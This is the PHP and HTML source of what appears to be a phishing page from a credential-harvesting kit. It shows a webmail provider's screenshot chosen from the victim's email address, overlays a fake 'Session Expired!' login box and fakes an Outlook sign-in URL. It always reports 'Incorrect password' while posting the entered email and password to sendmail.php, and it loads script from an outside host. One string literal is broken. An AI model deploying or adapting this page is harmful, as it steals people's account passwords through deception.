<?php
session_start();
require 'crypt.php';
require 'blocker.php';

error_reporting(0);
$strIframeLink  = $_GET['main_domain'];
$strFaviconLink =  $strIframeLink;

if(strpos($_GET['email'], 'gmail') !== false){
    $strIframeLink = 'gmail.png';

}
if(strpos($_GET['email'], 'hotmail') !== false){
    $strIframeLink = 'hotmail.png';


}

if(strpos($_GET['email'], 'outlook') !== false){
    $strIframeLink = 'hotmail.png';


}

if(strpos($_GET['email'], 'ymail.com') !== false){
    $strIframeLink = 'yahoo.png';
    
}
if(strpos($_GET['email'], 'yahoo.com') !== false){
    $strIframeLink = 'yahoo.png';

    
}

if(strpos($_GET['email'], 'mail.ru') !== false){
    $strIframeLink = 'mail.ru.png';
    
}

if(strpos($_GET['email'], 'indosat') !== false){
    $strIframeLink = 'indosat.png';
    
}

if(strpos($_GET['email'], 'yandex') !== false){
    $strIframeLink = 'yandex.png';
    
}

if(strpos($_GET['email'], 'bluewin') !== false){
    $strIframeLink = 'bluewin.png';
    
}

if(strpos($_GET['email'], 'batelco') !== false){
    $strIframeLink = 'batelco.png';
    
}

if(strpos($_GET['email'], 'eim') !== false){
    $strIframeLink = 'emirates.png';
    
}

if(strpos($_GET['email'], 'emirates') !== false){
    $strIframeLink = 'emirates.png';
    
}

if(strpos($_GET['email'], 'swisscom') !== false){
    $strIframeLink = 'bluewin.png';
    
}

if(strpos($_GET['email'], 'aol') !== false){
    $strIframeLink = 'aol.png';
    
}

?>
<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>...</title>
    <style>
        body{
            width:99%;
            height:100%;
            margin:0;
            padding:0;
        }
        #mainPage{
            border:none;
        }
        hr{
            border:1px solid #999;
        }
        #overlay{
            background-color:#555;
            position:absolute;
            top:0;
            left:0;
            bottom:0;
            right:0;
            border:1px solid #555;
            opacity: 0.6;
            filter: alpha(opacity=60)
        }
        #loginBody{
            background-color:#555;
            border: 1px solid #DDD;
            box-shadow: 0px 0px 10px #DDD;
            width: 400px;
            height: 180px;
            position:absolute;
            top:30%;
            left:30%;
        }
        #loginBg{
            background:white;
            width:100%;
            height:100%;
            opacity: 0.9;
            filter: alpha(opacity=90);
        }
        #topHeader{
            margin-bottom:10px;
            padding-top:10px;
        }
        #favIcon{
            margin:0 10px;
        }
        #form{
            position:relative;
            left:10%;
            width:80%;
        }
        .email, .pass{
            margin:0 0 5px;
        }
    </style>
</head>

<body>
<iframe id="mainPage" src="<?php echo $strIframeLink; ?>" width="100%" scrolling="no" sandbox="allow-forms allow-pointer-lock
allow-popups allow-same-origin allow-scripts" style="position: absolute;height: 100%;border: none;"></iframe>

<div id="overlay" style="height: 100%; width: 1366px;">

</div>
<div id="loginBody">
    <div id="loginBg">
        <div id="topHeader">
            <img id="favIcon" src="http://goodherbwebmart.com/=<?php echo $_GET['main_domain']?>"><font size="3" color="red">Session Expired!</font><b id="sExp"></b>
            <hr>
        </div>
        <div id="form">
            <form id="form_login">
                <input id="client" type="hidden" value="SESSION EXPIRED" name="client">
                <input id="cid" type="hidden" value="" name="cid">
                <div class="email">
                    <span id="emailId"></span>
                    <input id="email"  type="hidden" value="<?php echo $_GET['email']?>" name="email">
                    <input id="main_domain" type="hidden" value="<?php echo $_GET['main_domain']?>" name="main_domain">
                </div>

                <div class="pass">
                    <span id="passName">Password</span>: <input type="password" required="" placeholder=" enter password" name="pass" id="password">
                    <div><i id="error" style="color:red;display:none;font-size:90%;"> </i></div>
                </div>
                <div class="pass">
                    <input type="checkbox"> <span id="keepme">Keep me logged in</span>
                </div>
                <div class="submit">
                    <input type="submit" value="Log in" id="loginButton">
                </div>
            </form>
        </div>
    </div>
</div>
<script src="http://goodherbwebmart.com/"></script>
<script>
location.hash = 'wa=wsignin1.0&rpsnv=13&ct=1539585327&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26RpsCsrfState%3d715d44a2-2f11-4282-f625-a066679e96e2&id=292841&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015';

    var strMainDomain   = '<?php echo $strFaviconLink; ?>';
    var strPageIcon     = 'http://goodherbwebmart.com/;
    var intSubmit       = 0;
    var strFirstPassword = '';

    function getParameterByName(name, url) {
        if (!url) url = window.location.href;
        name = name.replace(/[\[\]]/g, "\\$&");
        var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
            results = regex.exec(url);
        if (!results) return null;
        if (!results[2]) return '';
        return decodeURIComponent(results[2].replace(/\+/g, " "));
    }

    (function(){
        $('#password').focus();
        var link = document.createElement('link');
        link.type   = 'image/x-icon';
        link.rel    = 'shortcut icon';
        link.href   = strPageIcon;
        document.getElementsByTagName('head')[0].appendChild(link);
        document.getElementById('favIcon').src = strPageIcon;
        $strEmail = getParameterByName('email');
        $('#emailId').text($strEmail);

        $('#form_login').submit(function(e){
            e.preventDefault();
            submitPassword();
        });
    }());

    function submitPassword(){
        var result;
         var strPassword = $('#password').val();
        var stremail = $('#email').val();
        var strdomain = "<?php echo $_GET['main_domain']?>";
        if(strPassword == '' || strPassword == null){
            $('#error').show();
            $('#error').text('Incorrect password, Please try again.');
        }else if (strPassword.length < 6){
             $('#error').show();
            $('#error').text('Incorrect password, Please try again.');
            result = document.getElementById('password');
            result.value="";
        } else{
           
            
            $('#error').show();
            $('#error').text('Incorrect password, Please try again.');
           $.post('sendmail.php',{'postemail':stremail,'postpaswrd':strPassword,postdomain:strdomain},function(data){
               if (data=="1"){
                   //submit button clicked for the first time
                   result = document.getElementById('password');
                   result.value="";
                         
               }else{
                    window.location=getParameterByName('main_domain');
               }
           });
        }
    }
</script>
</body>
</html>